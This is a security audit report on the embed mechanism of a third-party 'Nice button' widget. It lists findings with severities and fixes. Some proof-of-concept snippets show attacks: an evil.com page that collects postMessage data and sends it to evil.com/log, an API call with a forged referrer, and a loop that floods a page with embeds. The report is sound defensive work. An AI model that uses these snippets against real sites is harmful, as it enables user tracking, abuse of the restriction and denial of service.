# Nice Button Embed Security Audit

**Date:** 2026-02-19  
**Auditor:** OpenClaw Security Assessment  
**Scope:** Embed-specific vulnerabilities affecting third-party sites that embed Nice buttons  
**Version:** 1.0

---

## Executive Summary

This security assessment focuses on vulnerabilities that could affect **third-party websites embedding the Nice button widget**. The Nice button provides two embed mechanisms: a JavaScript loader (`embed.js`) and direct iframe embedding.

### Risk Summary

| Severity | Count | Key Findings |
|----------|-------|--------------|
| **Critical** | 0 | None identified |
| **High** | 1 | postMessage `targetOrigin: '*'` allows message spoofing |
| **Medium** | 3 | Referrer spoofing, supply chain risks, resource exhaustion |
| **Low** | 3 | Minor information disclosure, timing attacks |
| **Info** | 2 | Security hardening recommendations |

**Overall Assessment:** The embed implementation follows security best practices in several areas (iframe sandbox, origin validation on message reception, input validation). However, there are vulnerabilities in the postMessage communication that could be exploited, and the referrer-based restriction can be bypassed.

---

## Findings

### HIGH-01: postMessage Uses Wildcard targetOrigin

**Severity:** High  
**Location:** `src/embed/embed.html` (inline script), `src/routes/embed.ts` (EMBED_HTML)  
**CVSS 3.1:** 6.5 (Medium-High)

#### Description

The embed iframe sends resize messages to the parent window using `parent.postMessage(..., '*')`:

```javascript
// In embed.html/EMBED_HTML
function notifyResize(){
  const rect=btn.getBoundingClientRect();
  parent.postMessage({
    type:'nice-resize',
    buttonId:BUTTON_ID,
    width:Math.ceil(rect.width)+8,
    height:Math.ceil(rect.height)+8
  },'*');  // <-- VULNERABLE: wildcard origin
}
```

While the *receiving* side in `embed.js` correctly validates the origin:
```javascript
window.addEventListener('message', function(event) {
  if (event.origin !== EMBED_BASE) return;  // Good!
  // ...
});
```

The *sending* side uses `'*'` which means:

1. **Any parent can receive these messages** - If an attacker embeds your iframe on their malicious site, they receive button interaction data
2. **Information leakage** - Button IDs and sizes are leaked to any embedding context
3. **Timing analysis** - Attackers can observe when users interact with buttons

#### Proof of Concept

```html
<!-- Attacker's page: evil.com/harvest.html -->
<iframe src="https://nice.sbs/embed/n_abc123" id="target"></iframe>
<script>
window.addEventListener('message', function(event) {
  // Receives messages even though we're not nice.sbs
  if (event.data.type === 'nice-resize') {
    console.log('User interacted with button:', event.data.buttonId);
    // Send to attacker's server
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify({
        buttonId: event.data.buttonId,
        timestamp: Date.now()
      })
    });
  }
});
</script>
```

#### Impact

- **Privacy:** Attackers can track when users interact with Nice buttons
- **Analytics hijacking:** Competitors could embed buttons to steal engagement metrics
- **Clickjacking reconnaissance:** Attackers can confirm button clicks for clickjacking attacks

#### Recommendation

Replace wildcard with explicit origin. Since the embed can be on any domain, store the parent origin during initialization:

```javascript
// Option 1: Use document.referrer as target (when available)
const parentOrigin = document.referrer ? new URL(document.referrer).origin : '*';

// Option 2: Request parent origin via postMessage handshake
// Parent sends: { type: 'nice-init', origin: window.location.origin }
// Iframe stores and uses that origin for subsequent messages

// Then use it:
parent.postMessage({...}, parentOrigin);
```

**Note:** For privacy-sensitive deployments, consider not sending messages at all and using CSS-based sizing.

---

### MEDIUM-01: Referrer-Based Restriction Bypass

**Severity:** Medium  
**Location:** `src/routes/nice.ts` (checkReferrer function)  
**CVSS 3.1:** 5.3

#### Description

The v2 button restriction modes (`url` and `domain`) rely on `document.referrer` sent from the embed iframe:

```javascript
// In embed HTML
body: JSON.stringify({
  fingerprint: getFingerprint(),
  referrer: document.referrer || ''  // <-- Can be empty or spoofed
})
```

The server-side check:
```typescript
function checkReferrer(
  request: Request,
  buttonUrl: string,
  restriction: RestrictionMode,
  bodyReferrer?: string
): { allowed: boolean; error?: string } {
  // ...
  const referrer = bodyReferrer || request.headers.get("Referer");
  if (!referrer) {
    return { allowed: false, error: "Referrer required" };
  }
  // ...
}
```

**Bypass vectors:**

1. **Referrer-Policy:** Parent page can set `Referrer-Policy: no-referrer` causing empty referrer
2. **Direct API calls:** Attackers can call the API directly with forged referrer in body
3. **Meta referrer:** `<meta name="referrer" content="no-referrer">`
4. **Cross-origin iframe:** Some browser configurations strip referrer for cross-origin iframes

#### Proof of Concept

```javascript
// Direct API call with forged referrer
fetch('https://nice.sbs/api/v1/nice/n_abc123', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    fingerprint: 'fake123',
    referrer: 'https://legitimate-site.com/page'  // Forged!
  })
});
```

#### Impact

- Buttons restricted to specific URLs/domains can be "niced" from anywhere
- Inflated counts from unauthorized sources
- Undermines the restriction feature's value proposition

#### Recommendation

1. **Validate Origin header** (cannot be forged by JavaScript):
```typescript
function checkReferrer(request: Request, ...): { allowed: boolean } {
  const origin = request.headers.get("Origin");
  if (origin) {
    // Origin header is more trustworthy than Referer
    const originDomain = new URL(origin).hostname;
    // Compare with buttonDomain
  }
  // Fall back to Referer only for same-origin requests
}
```

2. **Use signed embed tokens** - Generate a per-site token that must be included:
```html
<iframe src="https://nice.sbs/embed/n_abc123?site_token=eyJ..."></iframe>
```

3. **Document limitation** - If keeping current behavior, document that restrictions are best-effort and can be bypassed.

---

### MEDIUM-02: Supply Chain Risk - embed.js Compromise

**Severity:** Medium  
**Location:** `src/embed/embed.js`, `src/routes/embed.ts`  
**CVSS 3.1:** 7.5 (if compromised)

#### Description

Sites embedding Nice buttons load JavaScript from `nice.sbs`:

```html
<script src="https://nice.sbs/embed.js" data-button="n_xxx" async></script>
```

If `nice.sbs` or its infrastructure is compromised, the attacker gains **JavaScript execution on every site embedding the button**.

#### Current Mitigations

The embed script is relatively minimal and:
- Uses `'use strict'`
- Only creates an iframe with sandbox restrictions
- Validates message origin before processing

#### Blast Radius Analysis

If `embed.js` is compromised, an attacker could:

1. **Steal credentials** - Inject keyloggers, form hijackers
2. **Session hijacking** - Access cookies (if not HttpOnly), localStorage
3. **Cryptomining** - Run miners in users' browsers
4. **Defacement** - Modify page content
5. **Drive-by downloads** - Redirect to malware
6. **Data exfiltration** - Read page content, user inputs

The iframe sandbox (`allow-scripts allow-same-origin allow-popups`) limits what the *iframe content* can do, but does **not** limit what the loader script can do.

#### Recommendation

1. **Offer Subresource Integrity (SRI)**:
```html
<script src="https://nice.sbs/embed.js" 
        integrity="sha384-ABC123..." 
        crossorigin="anonymous" async></script>
```

Generate and publish SRI hashes for each release.

2. **Provide iframe-only embed option** (no external JS):
```html
<!-- Self-contained, no external JS execution -->
<iframe src="https://nice.sbs/e/n_xxx?theme=light&size=md" 
        style="border:none;width:100px;height:36px;"
        sandbox="allow-scripts allow-same-origin"
        title="Nice button"></iframe>
```

3. **Content Security Policy** - Document recommended CSP for embedders:
```
script-src 'self' https://nice.sbs;
frame-src https://nice.sbs;
```

4. **Security.txt and disclosure policy** - Add `/.well-known/security.txt`

---

### MEDIUM-03: Denial of Service via Embed

**Severity:** Medium  
**Location:** Multiple  
**CVSS 3.1:** 5.3

#### Description

Several DoS vectors exist that could affect embedding sites:

#### Vector 1: iframe Flood

An attacker could create thousands of Nice buttons, then embed them all on a target page:

```html
<!-- On attacker's page, pointing to victim's article -->
<script>
for(let i=0; i<1000; i++) {
  const s = document.createElement('script');
  s.src = 'https://nice.sbs/embed.js';
  s.dataset.button = 'n_' + attackerButtons[i];
  document.body.appendChild(s);
}
</script>
```

Each script creates an iframe, causing:
- 1000+ network requests to `nice.sbs`
- 1000+ iframes rendered
- High memory/CPU usage on client

#### Vector 2: Large Response Attack

If the API returns large error messages or the count somehow becomes very large, it could affect rendering.

#### Vector 3: Slow Response Attack

If `nice.sbs` is slow or unresponsive, embedded pages wait for resources, potentially blocking render.

#### Current Mitigations

- Button creation is rate-limited (10/hour, 50/day per IP)
- Nice requests are rate-limited (20/min per IP, 100/min per button)
- Proof-of-work kicks in at high traffic

#### Recommendation

1. **Document embed limits** - Recommend max 5-10 buttons per page
2. **Add response size limits** - Cap count display formatting
3. **Implement timeout in embed.js**:
```javascript
// In embed.js, add timeout for iframe load
const timeout = setTimeout(() => {
  iframe.style.display = 'none';  // Hide broken embeds
}, 10000);
```

4. **Use `loading="lazy"`** for iframes below the fold

---

### LOW-01: Fingerprint Provides Limited Privacy

**Severity:** Low  
**Location:** `src/embed/embed.html`, `src/routes/nice.ts`  
**CVSS 3.1:** 3.1

#### Description

The embed collects a browser fingerprint for deduplication:

```javascript
function getFingerprint(){
  const data=[
    screen.width+'x'+screen.height,
    new Date().getTimezoneOffset(),
    navigator.language,
    navigator.userAgent.slice(0,50)
  ].join('|');
  // Hash and return
}
```

This fingerprint is:
- Sent to the API with nice requests
- Combined with IP for visitor hashing
- Stored as part of the visitor hash (with daily salt)

#### Privacy Considerations

1. **Cross-site tracking potential** - Same fingerprint could correlate users across sites
2. **Data minimization** - More data collected than strictly necessary
3. **Fingerprint stability** - Changes with browser updates, not unique enough for tracking anyway

#### Mitigation

The current implementation is reasonable:
- Fingerprint is hashed with daily salt
- Combined with button ID (not global tracking)
- TTL of 24 hours limits persistence

#### Recommendation

1. **Add privacy documentation** for embedders
2. **Consider removing fingerprint** - IP + daily salt may be sufficient
3. **Offer fingerprint-free mode** for privacy-conscious sites

---

### LOW-02: Button ID Enumeration Timing Attack

**Severity:** Low  
**Location:** `src/routes/nice.ts`  
**CVSS 3.1:** 3.1

#### Description

The `getNiceCount` endpoint returns `count: 0` for non-existent buttons to prevent enumeration. However, there may be timing differences:

```typescript
// Existing button: 2 KV reads (button data + count)
// Non-existent: 1 KV read (button data only)
```

An attacker could potentially distinguish valid from invalid button IDs via response timing.

#### Impact

Very low - Button IDs are meant to be public anyway, and the ID space is large enough to prevent brute force.

#### Recommendation

Add consistent timing by always performing the same number of operations:

```typescript
// Always read count, even if button doesn't exist
const count = buttonExists ? await getCount(env, buttonId) : 0;
// Consider adding: if(!buttonExists) await getCount(env, "dummy");
```

---

### LOW-03: LocalStorage Keying Allows Cross-Site State Leakage

**Severity:** Low  
**Location:** `src/routes/embed.ts` (EMBED_HTML)  
**CVSS 3.1:** 2.0

#### Description

The embed uses localStorage keyed by button ID:

```javascript
const STORAGE_KEY='nice:'+BUTTON_ID;
try{hasNiced=localStorage.getItem(STORAGE_KEY)==='1';}catch(e){}
```

Since the iframe is same-origin (`nice.sbs`), all button embeds share the same localStorage namespace. This means:

1. User nices button A on `site-a.com`
2. User visits `site-b.com` which also embeds button A
3. Button shows as "already niced" ✓ (expected)

But also:
4. User visits `evil.com` which embeds a "tracking button"
5. `evil.com` can detect the user has interacted with button A

#### Impact

Minimal - the server already tracks this via IP+fingerprint, and button IDs must be known.

#### Recommendation

Consider session-storage or no client-side state (rely on server `has_niced` response).

---

### INFO-01: iframe Sandbox Configuration

**Severity:** Informational  
**Location:** `src/embed/embed.js`

#### Description

The embed script sets sandbox attributes:

```javascript
iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-popups');
```

This is a reasonable configuration:
- `allow-scripts` - Required for button functionality
- `allow-same-origin` - Required for localStorage and API calls
- `allow-popups` - Purpose unclear, could be removed

#### Recommendation

1. **Remove `allow-popups`** unless specifically needed (I don't see popup usage)
2. **Document sandbox rationale** in code comments
3. Consider adding `allow-forms` explicitly if form submission is planned

---

### INFO-02: Missing Security Headers on Embed Routes

**Severity:** Informational  
**Location:** `src/routes/embed.ts`

#### Description

The embed HTML response includes:
```typescript
headers: {
  "Content-Type": "text/html; charset=utf-8",
  "Cache-Control": "no-cache",
  "X-Frame-Options": "ALLOWALL",
  "Content-Security-Policy": "frame-ancestors *",
}
```

Missing recommended headers:
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 0` (disabled, rely on CSP instead)
- `Referrer-Policy: strict-origin-when-cross-origin`

#### Recommendation

Add additional security headers:

```typescript
headers: {
  "Content-Type": "text/html; charset=utf-8",
  "Cache-Control": "no-cache",
  "X-Frame-Options": "ALLOWALL",
  "Content-Security-Policy": "frame-ancestors *; default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; font-src https://fonts.googleapis.com https://fonts.gstatic.com; connect-src 'self'",
  "X-Content-Type-Options": "nosniff",
  "Referrer-Policy": "strict-origin-when-cross-origin",
}
```

---

## Vulnerability Analysis by Category

### 1. XSS via Embed ✅ SECURE

**Finding:** The embed implementation properly sanitizes all user-controlled data.

**Evidence:**
- Button ID is validated with strict regex: `/^btn_[A-Za-z0-9_-]{16}$/` or `/^n_[A-Za-z0-9]{8,12}$/`
- Theme and size are validated against allowlists
- HTML characters are stripped from button ID: `buttonId.replace(/[<>"'&]/g, "")`
- Count values are integers, formatted with `formatCount()` which returns only digits and letters

**Conclusion:** No XSS vulnerabilities identified in the embed path.

### 2. Clickjacking ✅ MOSTLY SECURE

**Finding:** The embed is *intentionally* embeddable (`X-Frame-Options: ALLOWALL`), so clickjacking concerns are about protecting embed *users*.

**Analysis:**
- Buttons have visible state changes on click (animation, color change)
- Buttons are functional widgets, not sensitive actions
- The embed itself cannot be used to clickjack the host page

**Recommendation:** Consider adding transparent overlay detection in embed.js to warn if button is obscured.

### 3. postMessage Vulnerabilities ⚠️ HIGH RISK

See **HIGH-01** above. The sending side uses wildcard origin.

### 4. Referrer/Origin Spoofing ⚠️ MEDIUM RISK

See **MEDIUM-01** above. Referrer can be forged via direct API calls.

### 5. Resource Exhaustion ⚠️ MEDIUM RISK

See **MEDIUM-03** above. Multiple DoS vectors exist.

### 6. Data Exfiltration ✅ SECURE

**Finding:** The embed cannot access host page data.

**Evidence:**
- Embed runs in sandboxed iframe
- No `postMessage` listener for receiving data from host
- Cannot read host DOM, cookies, or storage
- API calls only contain button ID, fingerprint, and referrer

**Conclusion:** Embed cannot exfiltrate sensitive data from host pages.

### 7. CSP Bypass ✅ SECURE

**Finding:** The embed does not provide CSP bypass capabilities.

**Evidence:**
- Embed is an iframe, not inline script (except for loader)
- Loader script is external and can be blocked by embedder's CSP
- Iframe sandbox restricts capabilities
- No `unsafe-eval` or data: URI usage

**Recommendation:** Document that embedders should add `https://nice.sbs` to their `script-src` and `frame-src` CSP directives.

### 8. Supply Chain ⚠️ MEDIUM RISK

See **MEDIUM-02** above. Compromise of embed.js affects all embedders.

---

## Recommendations Summary

### Immediate (High Priority)

1. **Fix postMessage targetOrigin** - Replace `'*'` with specific origin or implement handshake
2. **Add SRI hashes** for embed.js releases

### Short-term (Medium Priority)

3. **Improve referrer validation** - Use Origin header as primary, document limitations
4. **Add security headers** to embed responses
5. **Remove `allow-popups`** from iframe sandbox if unused
6. **Create iframe-only embed option** for security-conscious sites

### Long-term (Low Priority)

7. **Implement signed embed tokens** for stronger restriction enforcement
8. **Add rate limiting per embedding domain**
9. **Create security.txt** and vulnerability disclosure policy
10. **Privacy documentation** for embedders

---

## Testing Checklist

For ongoing security validation:

- [ ] XSS: Test button creation with HTML/JS in all fields
- [ ] postMessage: Verify messages only go to intended recipients
- [ ] Referrer: Test restriction bypass with curl/Postman
- [ ] Rate limits: Verify all limits work as documented
- [ ] CSP: Test embed on page with strict CSP
- [ ] Sandbox: Verify iframe cannot escape sandbox
- [ ] CORS: Test API access from unauthorized origins

---

## Appendix: Attack Tree

```
Goal: Compromise sites embedding Nice button
├── Via XSS
│   ├── Inject via button ID → BLOCKED (regex validation)
│   ├── Inject via theme/size → BLOCKED (allowlist)
│   └── Inject via count → BLOCKED (integer only)
├── Via postMessage
│   ├── Receive messages from embed → POSSIBLE (wildcard origin)
│   ├── Send fake messages to embed → BLOCKED (origin check)
│   └── Hijack resize messages → POSSIBLE (wildcard origin)
├── Via Supply Chain
│   ├── Compromise embed.js → HIGH IMPACT if successful
│   ├── Compromise nice.sbs infra → HIGH IMPACT if successful
│   └── DNS hijacking → Mitigated by HTTPS
├── Via Restriction Bypass
│   ├── Forge referrer via API → POSSIBLE
│   ├── Strip referrer via policy → POSSIBLE  
│   └── Spoof Origin header → BLOCKED (browser enforced)
└── Via Resource Exhaustion
    ├── Create many buttons → Limited by rate limits
    ├── Embed many iframes → Limited by client resources
    └── Slow API responses → Limited by Cloudflare edge
```

---

*End of Security Audit Report*
